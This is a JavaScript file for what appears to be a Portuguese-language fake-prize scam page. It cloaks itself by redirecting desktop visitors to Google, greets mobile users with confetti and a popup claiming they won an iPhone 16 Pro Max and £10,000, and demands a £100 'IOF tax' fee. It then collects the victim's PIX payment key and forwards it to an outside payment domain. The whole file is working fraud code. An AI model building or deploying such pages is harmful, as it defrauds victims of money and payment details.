function redirecionarSeNaoMobile() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || 
                     (navigator.maxTouchPoints > 0 && 'ontouchstart' in document.documentElement);
  
    if (!isMobile && window.innerWidth > 768) {
        window.location.href = 'https://www.google.com';
    }
}

window.onload = () => {
    redirecionarSeNaoMobile();
    launchConfetti();
    setupPopupEventListeners();
};

function recarregarPagina() {
    location.reload();
}

function openPopup() {
    const popup = document.getElementById('popup');
    popup.style.display = 'flex'; 
}

function closePopup() {
    const popup = document.getElementById('popup');
    popup.style.display = 'none';
}

function updatePopupContent(newContent) {
    const popup = document.querySelector('.popup-content');
    popup.innerHTML = newContent;
}

function setupPopupEventListeners() {
    document.getElementById('btn-receber').addEventListener('click', function () {
        const newContent = `
            <span id="close-popup" onclick="closePopup()">x</span>
      
            <h2>💸 Receba seu prêmio via PIX!</h2>
            <p>🎉Parabéns novamente pelo seu prêmio de:</p>
            <h1 class="popup-title">£ 10.000,00!</h1>
            <p>Para que possamos liberar o valor imediatamente via PIX, é necessário o pagamento da taxa de IOF no valor fixo de<br><strong>£ 100,00.</strong></p>
            <p>Insira sua chave PIX para receber o valor:</p>
            <div class="pix-input-container" style="margin: 20px 0; text-align: center;">
                <label for="pix-key" class="pix-label" style="font-size: 16px; font-weight: bold; display: block; margin-bottom: 10px;">Chave PIX:</label>
                <input type="text" id="pix-key" class="pix-input" placeholder="Digite sua chave PIX aqui" style="padding: 10px; font-size: 16px; width: 80%; max-width: 400px; border: 2px solid #4CAF50; border-radius: 5px; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.2);">
            </div>
            <p>Atenção: Para concluir o pagamento e receber o valor diretamente na sua conta PIX agora, clique no botão abaixo:</p>
            <button class="receber-button" style="background-color: #4CAF50; color: white; font-size: 18px; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;" onclick="handlePixPayment();">QUERO RECEBER NO PIX!</button>
        `;
        updatePopupContent(newContent);
        openPopup();
    });

    document.getElementById('btn-premio').addEventListener('click', function () {
        const newContent = `
            <span id="close-popup" onclick="closePopup()">x</span>
           
            <h2>Seu Título Premiado:</h2>
            <p>Número do Título:</p>
            <h3>5156542178</h3>
            <p>Parabéns novamente por ganhar!</p>
            <button onclick="resetPopupContent()" style="background-color: #4CAF50; color: white; font-size: 16px; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Voltar</button>
        `;
        updatePopupContent(newContent);
    });
}

function resetPopupContent() {
    const initialContent = `
        <span id="close-popup" onclick="closePopup()">x</span>
        
        <h2>Parabéns!</h2>
        <p>Você Ganhou Um:</p>
        <h1 class="popup-title">IPhone 16 Pro Max</h1>
        <img src="images/popuppig.png" class="popupimgpig" alt="popupimg">
        <button id="btn-receber" style="background-color: #4CAF50; color: white; font-size: 16px; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">🚛 Receber em Casa</button>
        <button id="btn-premio" style="background-color: #4CAF50; color: white; font-size: 16px; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">🍀 Veja Seu Título Premiado</button>
    `;
    updatePopupContent(initialContent);
    setupPopupEventListeners();
}

const audioPlayer = document.getElementById('audio-player');
if (audioPlayer) {
    audioPlayer.addEventListener('play', openPopup);
}

function launchConfetti() {
    const duration = 2 * 1000;
    const end = Date.now() + duration;

    (function frame() {
        confetti({ particleCount: 7, angle: 60, spread: 55, origin: { x: 0 } });
        confetti({ particleCount: 7, angle: 120, spread: 55, origin: { x: 1 } });

        if (Date.now() < end) {
            requestAnimationFrame(frame);
        }
    })();
}

function handlePixPayment() {
    const pixKey = document.getElementById('pix-key').value;
    if (!pixKey) {
        alert('Por favor, insira sua chave PIX antes de continuar.');
        return;
    }
    if (!validatePixKey(pixKey)) {
        alert('Por favor, insira uma chave PIX válida.');
        return;
    }
    window.location.href = `https://pay.sbtdasorte.site/kYL6ge7nDxYZrKM?pixKey=${encodeURIComponent(pixKey)}`;
}

function validatePixKey(key) {
    const keyRegex = /^[a-zA-Z0-9._-]{6,}$/;
    return keyRegex.test(key);
}
